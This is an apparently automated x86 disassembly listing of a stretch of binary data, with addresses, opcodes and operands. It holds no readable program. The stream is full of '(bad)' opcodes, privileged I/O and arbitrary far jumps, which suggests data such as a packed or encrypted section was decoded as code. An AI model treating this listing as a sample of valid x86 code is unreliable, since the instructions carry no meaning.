  41948d:	xchg   esp,eax
  41948e:	mov    ds:0xf2b442c,al
  419493:	(bad)  [ecx+0x116f17bf]
  419499:	test   eax,0xc22f8907
  41949e:	pop    edi
  41949f:	lods   al,BYTE PTR ds:[esi]
  4194a0:	sbb    al,0x54
  4194a2:	xor    al,0x2d
  4194a4:	lahf   
  4194a5:	cmp    eax,0xc9fdca37
  4194aa:	fisub  DWORD PTR [ecx*4+0x6ecd59e2]
  4194b1:	repnz icebp 
  4194b3:	mov    ebx,0x60eb9d03
  4194b8:	adc    DWORD PTR [ebx],ecx
  4194ba:	outs   dx,DWORD PTR ds:[esi]
  4194bb:	xor    edx,esp
  4194bd:	ins    BYTE PTR es:[edi],dx
  4194be:	add    eax,0x922317ad
  4194c3:	xchg   edi,eax
  4194c4:	pop    es
  4194c5:	mov    ecx,DWORD PTR [ebp+0x29]
  4194c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194c9:	and    ecx,DWORD PTR [edx]
  4194cb:	addr16 mov ds:0xccad,al
  4194cf:	inc    esp
  4194d0:	test   eax,0x94f2879c
  4194d5:	iret   
  4194d6:	xchg   esi,eax
  4194d7:	lods   al,BYTE PTR ds:[esi]
  4194d8:	push   eax
  4194d9:	cmp    al,cl
  4194db:	pop    esi
  4194dc:	add    DWORD PTR [edi],esp
  4194de:	mov    ah,0xb9
  4194e0:	xlat   BYTE PTR ds:[ebx]
  4194e1:	mov    bh,0x75
  4194e3:	cmc    
  4194e4:	es jns 0x41950c
  4194e7:	add    eax,0xbe36f516
  4194ec:	xchg   ebx,eax
  4194ed:	sub    eax,0xa1474a6c
  4194f2:	rcr    DWORD PTR [ecx+0x5b],0xa
  4194f6:	rcr    DWORD PTR [ebx+0x1e039601],1
  4194fc:	(bad)  
  4194fd:	cmc    
  4194fe:	out    dx,eax
  4194ff:	aad    0x8a
  419501:	pusha  
  419502:	mov    dh,0xc9
  419504:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419505:	jns    0x419561
  419507:	pop    ds
  419508:	rol    DWORD PTR [edx],1
  41950a:	aam    0x94
  41950c:	add    al,0xbb
  41950e:	add    DWORD PTR [ecx+ebp*2+0x67adb33d],0xcf1bed6b
  419519:	mov    bh,BYTE PTR [eax+0x59244ee6]
  41951f:	ins    BYTE PTR es:[edi],dx
  419520:	or     eax,0x7f851489
  419525:	add    BYTE PTR [edi-0x7f852ccd],bl
  41952b:	lock pop es
  41952d:	lahf   
  41952e:	(bad)  
  41952f:	mov    ecx,0x3cf8bd94
  419534:	fidivr WORD PTR [edi]
  419536:	jmp    0x419593
  419538:	cwde   
  419539:	push   ebx
  41953a:	inc    ebp
  41953b:	inc    ebp
  41953c:	into   
  41953d:	imul   ebp,DWORD PTR ds:[ebx+0x42],0xffffffef
  419542:	and    edx,esi
  419544:	sub    ch,BYTE PTR ds:0x20106593
  41954a:	in     al,dx
  41954b:	scas   eax,DWORD PTR es:[edi]
  41954c:	mov    esp,0x4333332d
  419551:	test   BYTE PTR [esi],ah
  419553:	fsubr  QWORD PTR ss:[esi+edi*8]
  419557:	inc    esp
  419558:	jmp    0x1c8f:0xdfae36c9
  41955f:	pop    ds
  419560:	push   ss
  419561:	lds    edx,FWORD PTR [esi-0x47]
  419564:	cmp    al,0x26
  419566:	xchg   ecx,eax
  419567:	aaa    
  419568:	mov    ecx,0x98d98a0a
  41956d:	jae    0x41956f
  41956f:	scas   eax,DWORD PTR es:[edi]
  419570:	ds push cs
  419572:	lea    esi,[ebx-0x60]
  419575:	lods   eax,DWORD PTR ds:[esi]
  419576:	fiadd  DWORD PTR [esi-0x30]
  419579:	lods   al,BYTE PTR ds:[esi]
  41957a:	push   edx
  41957b:	sub    ebp,ebp
  41957d:	(bad)  
  41957e:	mov    al,BYTE PTR [ecx+0x59793a1]
  419584:	pushf  
  419585:	(bad)  
  419586:	scas   eax,DWORD PTR es:[edi]
  419587:	mov    ds:0xac08dfd4,al
  41958c:	cmp    eax,ebx
  41958e:	test   al,0xdb
  419590:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419591:	call   0x7a097059
  419596:	nop
  419597:	mov    esi,0x4ce30b4c
  41959c:	out    0xdc,eax
  41959e:	add    DWORD PTR [edx],edi
  4195a0:	sar    DWORD PTR [ebx],0xf4
  4195a3:	lahf   
  4195a4:	mov    cl,0x3
  4195a6:	jnp    0x41953f
  4195a8:	in     al,0x17
  4195aa:	das    
  4195ab:	pop    ecx
  4195ac:	xor    BYTE PTR [edi-0x32],bh
  4195af:	jnp    0x4195a4
  4195b1:	jbe    0x4195dd
  4195b3:	mov    edx,0xc64a435d
  4195b8:	pop    ebp
  4195b9:	jb     0x419628
  4195bb:	cmp    al,0x4d
  4195bd:	retf   0x5835
  4195c0:	outs   dx,BYTE PTR ds:[esi]
  4195c1:	pusha  
  4195c2:	pop    es
  4195c3:	cmp    DWORD PTR [eax+0x327f262e],ebx
  4195c9:	and    ch,BYTE PTR [esi]
  4195cb:	or     al,0xf0
  4195cd:	pop    ds
  4195ce:	xor    al,0xa7
  4195d0:	pop    esp
  4195d1:	cmp    bl,BYTE PTR [esi]
  4195d3:	in     al,dx
  4195d4:	and    BYTE PTR [esi-0x1f],ch
  4195d7:	daa    
  4195d8:	xchg   edx,eax
  4195d9:	pop    esi
  4195da:	sbb    esi,DWORD PTR [ecx-0x46]
  4195dd:	leave  
  4195de:	mov    ch,0x1c
  4195e0:	aas    
  4195e1:	mov    edx,0x81d69dee
  4195e6:	mov    esp,0x29b9d2db
  4195eb:	or     ch,BYTE PTR [esi+0x36]
  4195ee:	daa    
  4195ef:	inc    edx
  4195f0:	adc    al,BYTE PTR [eiz*1-0x3c5b4f0b]
  4195f7:	(bad)  
  4195f8:	loopne 0x419583
  4195fa:	loop   0x4195d6
  4195fc:	mov    BYTE PTR ds:[ebx-0x68],al
  419600:	push   0x34
  419602:	call   0xd4540706
  419607:	test   BYTE PTR [eax],0x29
  41960a:	popf   
  41960b:	leave  
  41960c:	push   ds
  41960d:	push   esp
  41960e:	ret    0x6b0b
  419611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419612:	pop    esp
  419613:	mov    ch,0xa5
  419615:	stos   BYTE PTR es:[edi],al
  419616:	mov    eax,0x61a26909
  41961b:	cmp    DWORD PTR [edx-0x3757066],eax
  419621:	stc    
  419622:	jecxz  0x41964e
  419624:	shr    BYTE PTR [ebp+0x1c],0x28
  419628:	bound  edx,QWORD PTR [ebx+0x6786dffa]
  41962e:	inc    esi
  41962f:	mov    dh,0xea
  419631:	call   0x1232:0xb89d8f29
  419638:	jne    0x419685
  41963a:	sbb    BYTE PTR [ebp+0x16782f5],0xe7
  419641:	or     eax,0x6fdabebc
  419646:	loopne 0x4195ee
  419648:	(bad)  
  41964a:	lods   eax,DWORD PTR ds:[esi]
  41964b:	pop    DWORD PTR [esi-0x5e]
  41964e:	xchg   edi,eax
  41964f:	dec    edi
  419650:	in     eax,0x65
  419652:	iret   
  419653:	pop    esi
  419654:	push   0xcf07ed7f
  419659:	pop    ebp
  41965a:	lea    edx,[ebx+0x7d1ba7aa]
  419660:	stos   DWORD PTR es:[edi],eax
  419661:	mov    ds:0x6a80dd9b,al
  419666:	mov    edi,0xf13cc1ef
  41966b:	dec    eax
  41966c:	push   eax
  41966d:	js     0x4196e2
  41966f:	fdiv   st,st(4)
  419671:	jno    0x419699
  419673:	lds    ebp,FWORD PTR fs:[edi+edx*4-0x4c337c95]
  41967b:	jb     0x41967c
  41967d:	ret    
  41967e:	and    DWORD PTR [ebx-0x67f01848],ebp
  419684:	inc    esi
  419685:	scas   al,BYTE PTR es:[edi]
  419686:	js     0x41962a
  419688:	fcomp  QWORD PTR [edx+0x7b3537a0]
  41968e:	dec    ebp
  41968f:	mov    bh,0xa0
  419691:	pop    es
  419692:	aaa    
  419693:	add    ebp,DWORD PTR [ebx+eax*1]
  419696:	adc    edx,DWORD PTR [esi-0x1]
  419699:	push   0xffffffef
  41969b:	and    BYTE PTR [esi],ch
  41969d:	push   cs
  41969e:	int    0xff
  4196a0:	sbb    BYTE PTR [ecx],al
  4196a2:	and    BYTE PTR [ebx+0x20c5995d],cl
  4196a8:	or     al,0x57
  4196aa:	shl    DWORD PTR [esi-0x11],0xa8
  4196ae:	mov    ch,BYTE PTR [eax+0x5c6f2cc4]
  4196b4:	inc    DWORD PTR [edx+0x71bbcf31]
  4196ba:	repnz mov dl,0x44
  4196bd:	adc    al,0x1
  4196bf:	cs jp  0x419685
  4196c2:	lahf   
  4196c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196c4:	js     0x4196a7
  4196c6:	add    ebx,edx
  4196c8:	and    al,0x8f
  4196ca:	ins    DWORD PTR es:[edi],dx
  4196cb:	jb     0x419683
  4196cd:	das    
  4196ce:	nop
  4196cf:	cmp    eax,0x5344f12b
  4196d4:	ss pop eax
  4196d6:	pop    ds
  4196d7:	aad    0x9f
  4196d9:	je     0x4196de
  4196db:	stos   DWORD PTR es:[edi],eax
  4196dc:	and    esi,DWORD PTR [esi-0x65]
  4196df:	and    DWORD PTR ds:0x7257bd26,ecx
  4196e5:	rcr    DWORD PTR [esi+esi*4],1
  4196e8:	mov    esi,0x18c5a69f
  4196ed:	sbb    edi,ecx
  4196ef:	in     eax,0x99
  4196f1:	sub    BYTE PTR [edi+0x4afe0b8],dh
  4196f7:	inc    esp
  4196f8:	call   0x3f7f99f4
  4196fd:	and    al,BYTE PTR [ecx+0x1d3ebbf]
  419703:	jecxz  0x419734
  419705:	jb     0x4196d2
  419707:	jmp    DWORD PTR [edi]
  419709:	cmp    DWORD PTR [esi],ebx
  41970b:	inc    edx
  41970c:	out    dx,al
  41970d:	popa   
  41970e:	in     eax,0x80
  419710:	inc    esi
  419711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419712:	sbb    edx,ebx
  419714:	cli    
  419715:	stos   DWORD PTR es:[edi],eax
  419716:	sub    ebp,edi
  419718:	xchg   DWORD PTR ds:0x112c8553,edx
  41971e:	in     eax,dx
  41971f:	push   ds
  419720:	jle    0x4196ec
  419722:	add    eax,0x381a7958
  419727:	stos   BYTE PTR es:[edi],al
  419728:	icebp  
  419729:	sbb    DWORD PTR [ebp-0x58],0xb248d5a
  419730:	clc    
  419731:	jne    0x4196b7
  419733:	dec    edi
  419734:	xchg   ecx,eax
  419735:	adc    DWORD PTR [ecx],edi
  419737:	sbb    edi,ebx
  419739:	out    0xa5,al
  41973b:	std    
  41973c:	sbb    ebx,DWORD PTR [edx]
  41973e:	cmp    ch,al
  419740:	pop    ebp
  419741:	sub    eax,0x68e6a7c2
  419746:	and    eax,0x5eb1385b
  41974b:	leave  
  41974c:	pop    ebx
  41974d:	shr    DWORD PTR [esi+0x586a0b12],0x90
  419754:	inc    esi
  419755:	popa   
  419756:	mov    esp,0xc00e75ff
  41975b:	fcomp  DWORD PTR [ecx-0x41]
  41975e:	adc    edx,DWORD PTR [edx-0x1b]
  419761:	fcomp  QWORD PTR [ebp+0x504635b5]
  419767:	xchg   esp,eax
  419768:	fisub  DWORD PTR [esi+0x5ea4519]
  41976e:	fdivr  st,st(7)
  419770:	out    dx,al
  419771:	mov    ds:0xc46ab71,al
  419776:	stos   BYTE PTR es:[edi],al
  419777:	ret    0x79d7
  41977a:	cmp    esi,edi
  41977c:	pop    eax
  41977d:	icebp  
  41977e:	and    esp,DWORD PTR [edx+ebx*8]
  419781:	mov    WORD PTR [ecx-0x4f1ccd4a],ss
  419787:	pop    esi
  419788:	mov    ds:0x496cc635,al
  41978d:	icebp  
  41978e:	and    DWORD PTR [edi-0x60d11272],edi
  419794:	addr16 cld 
  419796:	call   0x57eb:0xa97ce117
  41979d:	adc    eax,0xa28aac52
  4197a2:	shl    BYTE PTR [edx],1
  4197a4:	dec    edi
  4197a5:	inc    eax
  4197a6:	mov    ebp,0x4532d6fd
  4197ab:	das    
  4197ac:	and    DWORD PTR [ebx],esi
  4197ae:	les    ebp,FWORD PTR [edi-0x18]
  4197b1:	inc    esp
  4197b2:	ja     0x41973a
  4197b4:	in     al,dx
  4197b5:	adc    al,0xa7
  4197b7:	sub    dl,cl
  4197b9:	sbb    eax,0xa4e7c856
  4197be:	mov    ebx,0x348b73fd
  4197c3:	loopne 0x4197ce
  4197c5:	mov    eax,0xc85e685c
  4197ca:	mov    ds:0xd208297d,eax
  4197cf:	push   es
  4197d0:	push   ecx
  4197d1:	pop    eax
  4197d2:	push   ds
  4197d3:	(bad)  
  4197d4:	sub    BYTE PTR [ebp-0x71],cl
  4197d7:	aam    0xc
  4197d9:	push   cs
  4197da:	pop    ds
  4197db:	sub    esp,0xfffffff9
  4197de:	in     al,0x84
  4197e0:	xchg   edi,eax
  4197e1:	pop    esp
  4197e2:	aam    0xcb
  4197e4:	rol    esi,cl
  4197e6:	pop    edx
  4197e7:	fwait
  4197e8:	sub    al,0xe0
  4197ea:	push   0x604dcb59
  4197ef:	leave  
  4197f0:	lods   al,BYTE PTR ds:[esi]
  4197f1:	jmp    0x4197a5
  4197f3:	cmp    al,0xe5
  4197f5:	test   ebx,eax
  4197f7:	mov    ch,0xa8
  4197f9:	and    eax,DWORD PTR [eax]
  4197fb:	(bad)  
  4197fc:	popa   
  4197fd:	dec    eax
  4197fe:	in     al,dx
  4197ff:	js     0x4197bb
  419801:	jecxz  0x4197f2
  419803:	inc    edx
  419804:	mov    al,ds:0x4214a9df
  419809:	aaa    
  41980a:	adc    BYTE PTR [edx+esi*1-0x99dfc60],dh
  419811:	jmp    0xde5:0xd9bf8ab8
  419818:	push   0x45
  41981a:	fwait
  41981b:	and    DWORD PTR [edi],ecx
  41981d:	cmp    ebx,DWORD PTR [edx-0x114c54fc]
  419823:	gs rol cl,0xba
  419827:	stos   BYTE PTR es:[edi],al
  419828:	pop    ss
  419829:	xchg   ecx,eax
  41982a:	mov    ds:0x304134f6,al
  41982f:	sub    bl,al
  419831:	jle    0x419843
  419833:	pop    edx
  419834:	jmp    0x4198b4
  419836:	push   ebx
  419837:	enter  0x1615,0xf8
  41983b:	fst    QWORD PTR es:[edi-0x74]
  41983f:	mov    eax,ds:0xec3d5cd0
  419844:	adc    BYTE PTR [ebx],bl
  419846:	push   cs
  419847:	addr16 jns 0x41987d
  41984a:	aad    0xfe
  41984c:	inc    eax
  41984d:	mov    dl,0xe6
  41984f:	loop   0x41986f
  419851:	pushf  
  419852:	aas    
  419853:	sbb    BYTE PTR [edx],cl
  419855:	xchg   ebx,eax
  419856:	and    BYTE PTR [ebp+0x24],0x93
  41985a:	(bad)  [edx-0x62878256]
  419860:	pop    esi
  419861:	mov    esp,0x800f2250
  419866:	xchg   ecx,eax
  419867:	inc    eax
  419868:	and    BYTE PTR [ebp+0x70],ah
  41986b:	xor    BYTE PTR [esi+0x5],cl
  41986e:	sar    DWORD PTR [ebp+0x6f],cl
  419871:	lods   eax,DWORD PTR ds:[esi]
  419872:	mov    cl,0xb0
  419874:	in     eax,0x69
  419876:	outs   dx,BYTE PTR ds:[esi]
  419877:	adc    BYTE PTR [esi],ch
  419879:	pop    esp
  41987a:	into   
  41987b:	rcr    BYTE PTR [ebx-0x25],1
  41987e:	fist   WORD PTR [ebx]
  419880:	adc    eax,0xef4c250c
  419885:	sub    dl,bl
  419887:	ficomp DWORD PTR [ecx-0x40b54106]
  41988d:	test   BYTE PTR [edx-0x39],dh
  419890:	int3   
  419891:	call   0x4d8c:0xc424d468
  419898:	retf   
  419899:	cmp    al,0x38
  41989b:	in     al,0xee
  41989d:	das    
  41989e:	(bad)  
  41989f:	adc    edx,DWORD PTR [ecx-0x7e]
  4198a2:	sub    DWORD PTR [ebx],0xfffffffc
  4198a5:	cmp    BYTE PTR [edx+0x23],0x1b
  4198a9:	out    0x6e,al
  4198ab:	ret    
  4198ac:	shl    BYTE PTR [ecx-0x6a],0xcb
  4198b0:	aad    0x50
  4198b2:	in     al,0x15
  4198b4:	aam    0x25
  4198b6:	test   eax,0xed2ef4b0
  4198bb:	or     eax,edx
  4198bd:	rcr    BYTE PTR [edx+0x7012e2c6],1
  4198c3:	push   ebp
  4198c4:	std    
  4198c5:	jno    0x419936
  4198c7:	inc    edx
  4198c8:	shl    BYTE PTR [eax-0x24d35981],0xef
  4198cf:	mov    dl,0x6e
  4198d1:	lahf   
  4198d2:	pop    ss
  4198d3:	call   0x328740ea
  4198d8:	mov    WORD PTR [ecx+0x143f6f1b],es
  4198de:	cmp    ah,BYTE PTR [eax+0x6]
  4198e1:	ins    DWORD PTR es:[edi],dx
  4198e2:	frstor [edx+edx*1+0x58245544]
  4198e9:	stos   BYTE PTR es:[edi],al
  4198ea:	fisub  WORD PTR [ebx+esi*8]
  4198ed:	pop    esi
  4198ee:	dec    ecx
  4198ef:	mov    esp,0xf15d271d
  4198f4:	scas   eax,DWORD PTR es:[edi]
  4198f5:	pop    ds
  4198f6:	mov    eax,ds:0xd9bee838
  4198fb:	mov    BYTE PTR [edx-0x60],dh
  4198fe:	push   ds
  4198ff:	out    0xfc,eax
  419901:	pushf  
  419902:	popa   
  419903:	ins    DWORD PTR es:[edi],dx
  419904:	aam    0x83
  419906:	ret    
  419907:	scas   al,BYTE PTR es:[edi]
  419908:	jb     0x419974
  41990a:	test   BYTE PTR [ecx-0x7bc40656],ch
  419910:	or     DWORD PTR [esp+eiz*8-0x2261e0ce],edx
  419917:	inc    BYTE PTR [edx]
  419919:	loopne 0x4198d7
  41991b:	jne    0x41995a
  41991d:	es enter 0x69f5,0x76
  419922:	jmp    0x41994f
  419924:	sahf   
  419925:	addr16 inc esp
  419927:	data16 jo 0x4198d6
  41992a:	mul    DWORD PTR [edx]
  41992c:	xchg   ebx,eax
  41992d:	std    
  41992e:	adc    al,ah
  419930:	jo     0x419964
  419932:	and    BYTE PTR [edi+0x734cc3d8],bh
  419938:	cdq    
  419939:	mov    ds:0x1612a5df,eax
  41993e:	sahf   
  41993f:	pop    esp
  419940:	retf   
  419941:	push   ebx
  419942:	in     al,0x45
  419944:	in     eax,dx
  419945:	pop    eax
  419946:	mov    dh,0xc7
  419948:	and    ebx,DWORD PTR [eax-0x550b9433]
  41994e:	mov    al,0x3c
  419950:	xor    ch,BYTE PTR [ebx+edi*2+0x2e8ceeaa]
  419957:	(bad)  
  419958:	pop    ds
  419959:	add    ebp,ebp
  41995b:	es mov esi,0x66f2452f
  419961:	dec    ecx
  419962:	fild   WORD PTR [eax-0x423c7a7c]
  419968:	lods   eax,DWORD PTR ds:[esi]
  419969:	in     eax,0x55
  41996b:	pop    es
  41996c:	in     eax,0xa4
  41996e:	mov    ecx,0x2a09b729
  419973:	punpckldq mm4,DWORD PTR [esi-0x7c1205b4]
  41997a:	mov    al,ds:0xe7a35252
  41997f:	ret    
  419980:	loop   0x4199cc
  419982:	xlat   BYTE PTR ds:[ebx]
  419983:	jecxz  0x41990a
  419985:	sbb    al,0x7d
  419987:	mov    ebx,DWORD PTR [esi+ebx*4+0x2d]
  41998b:	test   BYTE PTR [ebx],al
  41998d:	out    0x59,eax
  41998f:	mov    bl,0xc4
  419991:	mov    al,ds:0xfb02e458
  419996:	stc    
  419997:	(bad)  
  419998:	cld    
  419999:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41999a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41999b:	mov    dl,0x0
  41999d:	mov    ah,0x8c
  41999f:	(bad)  
  4199a0:	or     dl,BYTE PTR ds:0xf5b8718b
  4199a6:	retf   
  4199a7:	cmp    BYTE PTR [eax],0xff
  4199aa:	(bad)  [ecx]
  4199ac:	popf   
  4199ad:	(bad)  
  4199ae:	push   esi
  4199af:	lea    ecx,[eax-0x62]
  4199b2:	or     esi,DWORD PTR [edx+0x54]
  4199b5:	mov    ecx,0xe818fc36
  4199ba:	xchg   BYTE PTR [edx-0x719a7ab5],dh
  4199c0:	push   esi
  4199c1:	xor    cl,BYTE PTR [ebp+0x28]
  4199c4:	or     BYTE PTR [esi-0x3a],0x68
  4199c8:	push   0xca7a6795
  4199cd:	sub    esi,DWORD PTR [ecx]
  4199cf:	mov    eax,ds:0xaf2391f4
  4199d4:	enter  0x57ae,0x62
  4199d8:	daa    
  4199d9:	bound  eax,QWORD PTR [eax-0x596b9c90]
  4199df:	arpl   WORD PTR [edx],dx
  4199e1:	bound  ebx,QWORD PTR [edi+0x4610cdb3]
  4199e7:	and    DWORD PTR [edi],0xb7549c9b
  4199ed:	aas    
  4199ee:	lahf   
  4199ef:	inc    edi
  4199f0:	into   
  4199f1:	ficom  WORD PTR [ebp-0x19e4b67f]
  4199f7:	xchg   ebx,eax
  4199f8:	(bad)  
  4199f9:	add    bh,BYTE PTR [esi-0x79]
  4199fc:	(bad)  
  4199fd:	ficom  WORD PTR [edx]
  4199ff:	and    BYTE PTR ds:0x9d13bc3,dl
  419a05:	mov    ?,WORD PTR [esi]
  419a07:	stc    
  419a08:	ja     0x419a84
  419a0a:	dec    ecx
  419a0b:	or     bh,BYTE PTR [ecx]
  419a0d:	push   ss
  419a0e:	inc    esp
  419a0f:	sbb    eax,0x22a978d0
  419a14:	aaa    
  419a15:	not    BYTE PTR [edi-0x322f712c]
  419a1b:	int3   
  419a1c:	adc    dl,BYTE PTR [ebp-0xb]
  419a1f:	sbb    BYTE PTR [ecx-0x1b],ah
  419a22:	repnz dec ebx
  419a24:	fnstenv ds:0x37837fb6
  419a2a:	cld    
  419a2b:	adc    al,al
  419a2d:	not    dh
  419a2f:	mov    bl,0xe6
  419a31:	inc    ebp
  419a32:	int    0x3f
  419a34:	repnz inc edx
  419a36:	test   DWORD PTR [esp+esi*8+0x3],ebp
  419a3a:	jge    0x419a7c
  419a3c:	jo     0x4199e8
  419a3e:	xchg   edi,eax
  419a3f:	push   0x7e
  419a41:	jl     0x419a13
  419a43:	adc    dh,bl
  419a45:	dec    edi
  419a46:	es inc edx
  419a48:	and    BYTE PTR [ebp+0x71e0e939],dl
  419a4e:	fdivr  DWORD PTR [ebp+0x40]
  419a51:	and    bl,BYTE PTR ds:0x405de436
  419a57:	adc    DWORD PTR [ecx+edi*4+0x510636da],eax
  419a5e:	xor    DWORD PTR [ebp-0x43],0x33e6a8fa
  419a65:	repnz mov WORD PTR [esi],gs
  419a68:	or     bl,dh
  419a6a:	sbb    DWORD PTR [edx],esp
  419a6c:	cld    
  419a6d:	dec    ecx
  419a6e:	fwait
  419a6f:	and    DWORD PTR [edi],0xd00a17ba
  419a75:	xchg   DWORD PTR [ebp+0x31],ebx
  419a78:	xchg   eax,edi
  419a7a:	addr16 pop ds
  419a7c:	jb     0x419a25
  419a7e:	mov    ah,0xdd
  419a80:	outs   dx,DWORD PTR ds:[esi]
  419a81:	sbb    al,0xc5
  419a83:	jno    0x7f5c8a7a
  419a89:	cwde   
  419a8a:	push   0x76
  419a8c:	or     eax,0x650707a4
  419a91:	jmp    0x419a92
  419a93:	xlat   BYTE PTR ds:[ebx]
  419a94:	and    DWORD PTR [ecx],ebx
  419a96:	cmp    esp,DWORD PTR [ebx]
  419a98:	jp     0x419aa0
  419a9a:	div    DWORD PTR [edx]
  419a9c:	push   eax
  419a9d:	push   eax
  419a9e:	mov    ds:0x734053e0,al
  419aa3:	sub    BYTE PTR [ebp+0x2c],bh
  419aa6:	jp     0x419b04
  419aa8:	daa    
  419aa9:	in     eax,0x15
  419aab:	adc    ecx,DWORD PTR [ebx-0x3d82aaed]
  419ab1:	(bad)  
  419ab2:	lods   eax,DWORD PTR ds:[esi]
  419ab3:	pop    esi
  419ab4:	pushf  
  419ab5:	psrad  mm6,QWORD PTR [edi-0x127836b0]
  419abc:	mov    ds:0x7d279256,al
  419ac1:	cmc    
  419ac2:	mov    esp,0xc1bc1059
  419ac7:	dec    esi
  419ac8:	xchg   DWORD PTR [eax+0x38],ebp
  419acb:	sub    BYTE PTR [ebx+edi*1-0x6c],ah
  419acf:	push   ds
  419ad0:	out    dx,al
  419ad1:	dec    ecx
  419ad2:	test   bh,bl
  419ad4:	in     eax,dx
  419ad5:	fisubr WORD PTR [eax]
  419ad7:	cmp    edi,DWORD PTR [esi+0xa2f6daf]
  419add:	xchg   esi,eax
  419ade:	retf   0x7238
  419ae1:	js     0x419a7c
  419ae3:	xchg   edx,eax
  419ae4:	sbb    edi,DWORD PTR [esi-0x27]
  419ae7:	pop    esi
  419ae8:	arpl   WORD PTR [ebx+0x4149c2ae],di
  419aee:	fld    DWORD PTR [edx]
  419af0:	jae    0x419b26
  419af2:	jl     0x419ac9
  419af4:	dec    eax
  419af5:	rcr    DWORD PTR [ebx+edx*8+0xb],0xd0
  419afa:	rol    BYTE PTR [ebx-0x7dc433e8],0x3a
  419b01:	and    ebx,ecx
  419b03:	shl    BYTE PTR [edx-0x35],cl
  419b06:	sub    esi,DWORD PTR [edx+0x6e]
  419b09:	add    al,0x34
  419b0b:	cmp    esi,DWORD PTR [eax+0x1422dc50]
  419b11:	dec    edx
  419b12:	test   BYTE PTR ds:0x4a1b52a2,0x29
  419b19:	xor    ecx,ebx
  419b1b:	scas   al,BYTE PTR es:[edi]
  419b1c:	dec    ecx
  419b1d:	fcmove st,st(1)
  419b1f:	sti    
  419b20:	cld    
  419b21:	mov    ecx,0xaf23d158
  419b26:	and    ecx,esi
  419b28:	imul   ebx,DWORD PTR [eax-0x6],0x3f47dd10
  419b2f:	icebp  
  419b30:	sub    ch,BYTE PTR [esp+edi*1+0x773709e9]
  419b37:	fsubr  DWORD PTR [edi]
  419b39:	ja     0x419b82
  419b3b:	and    BYTE PTR [ecx],0x1
  419b3e:	mov    ch,0xe3
  419b40:	sub    DWORD PTR [edi+0x38d2c13a],ebx
  419b46:	mov    eax,0x4475e78e
  419b4b:	out    0x74,eax
  419b4d:	fs pushf 
  419b4f:	dec    esp
  419b50:	inc    eax
  419b51:	push   edx
  419b53:	jne    0x419b5e
  419b55:	xor    eax,0xa032dd2b
  419b5a:	mov    DWORD PTR ds:0x4e9bf6c5,esp
  419b60:	pop    ss
  419b61:	mov    BYTE PTR [ecx],cl
  419b63:	mov    esp,0x31f5aebd
  419b68:	pop    ebp
  419b69:	enter  0x2e8c,0x38
  419b6d:	dec    ecx
  419b6e:	xor    BYTE PTR [edi-0x10],bl
  419b71:	sbb    ch,bh
  419b73:	popa   
  419b74:	leave  
  419b75:	xchg   BYTE PTR [edi+0xd49035a],ch
  419b7b:	aam    0x63
  419b7d:	jp     0x419b6a
  419b7f:	fwait
  419b80:	in     al,0x94
  419b82:	aas    
  419b83:	xchg   ebx,eax
  419b84:	mov    DWORD PTR [eax-0x39],0xd23a1927
  419b8b:	retf   0x293e
  419b8e:	outs   dx,BYTE PTR ds:[esi]
  419b8f:	sbb    eax,0x1993059b
  419b94:	in     eax,dx
  419b95:	lea    esi,[edx+0x41]
  419b98:	mov    ds:0x45a533d2,eax
  419b9d:	loopne 0x419b82
  419b9f:	jno    0x419bb1
  419ba1:	mov    DWORD PTR [edi+0x7e],edx
  419ba4:	hlt    
  419ba5:	pop    ebx
  419ba6:	mov    ah,BYTE PTR [esi+0x6ef52d3b]
  419bac:	test   eax,0x54e00736
  419bb1:	mov    eax,0x466e68c4
  419bb6:	jbe    0x419bfa
  419bb8:	mov    cl,0xc4
  419bba:	jo     0x419bfe
  419bbc:	scas   eax,DWORD PTR es:[edi]
  419bbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bbe:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  419bc0:	addr16 add ebx,esp
  419bc3:	mov    ds:0xb2fffba,eax
  419bc8:	xchg   edi,eax
  419bc9:	push   eax
  419bca:	inc    esi
  419bcb:	imul   eax,DWORD PTR [ebp-0x28bd4bbf],0x29
  419bd2:	cmc    
  419bd3:	and    BYTE PTR [edx+0x17],ah
  419bd6:	cmp    BYTE PTR [edi+0x2db1bf9e],cl
  419bdc:	jo     0x419c02
  419bde:	mov    esp,0xbc526b57
  419be3:	add    al,0x1f
  419be5:	adc    DWORD PTR [ebp+0xe],ecx
  419be8:	cmp    esp,DWORD PTR [eax]
  419bea:	jecxz  0x419c24
  419bec:	xor    al,0x7
  419bee:	dec    esi
  419bef:	mov    edx,edi
  419bf1:	xchg   edx,eax
  419bf2:	sub    edi,eax
  419bf4:	test   al,0xff
  419bf6:	jmp    0x419c23
  419bf8:	mul    DWORD PTR [ebx+0x4e]
  419bfb:	mov    ebx,0x2e5e91fe
  419c00:	or     esi,DWORD PTR [edi]
  419c02:	aam    0x11
  419c04:	and    ebp,DWORD PTR [eax-0x76]
  419c07:	sub    dh,bh
  419c09:	xchg   esp,eax
  419c0a:	xor    DWORD PTR [edx+0x73464376],0xffffffe9
  419c11:	xlat   BYTE PTR ds:[ebx]
  419c12:	xor    DWORD PTR [ebx+0x16],ecx
  419c15:	not    DWORD PTR [eax]
  419c17:	xor    DWORD PTR [esp+esi*4],ebx
  419c1a:	dec    esi
  419c1b:	xchg   BYTE PTR [edx-0x72a0c5f6],dh
  419c21:	pop    eax
  419c22:	into   
  419c23:	sub    bh,al
  419c25:	jne    0x419ba9
  419c27:	popa   
  419c28:	dec    esp
  419c29:	mov    ch,0xfb
  419c2b:	inc    DWORD PTR [edi-0x15bc77cd]
  419c31:	arpl   WORD PTR [edx+0x2ffbe7bf],si
  419c37:	add    dl,cl
  419c39:	dec    ecx
  419c3a:	out    0x93,eax
  419c3c:	pop    ss
  419c3d:	push   ds
  419c3e:	mov    edx,0x1d26b536
  419c43:	push   ss
  419c44:	test   DWORD PTR [edi+0x56],0xdd25401c
  419c4b:	push   edx
  419c4c:	push   ds
  419c4d:	and    al,BYTE PTR [ebx]
  419c4f:	inc    ecx
  419c50:	mov    ah,0x4a
  419c52:	jmp    0x535153ab
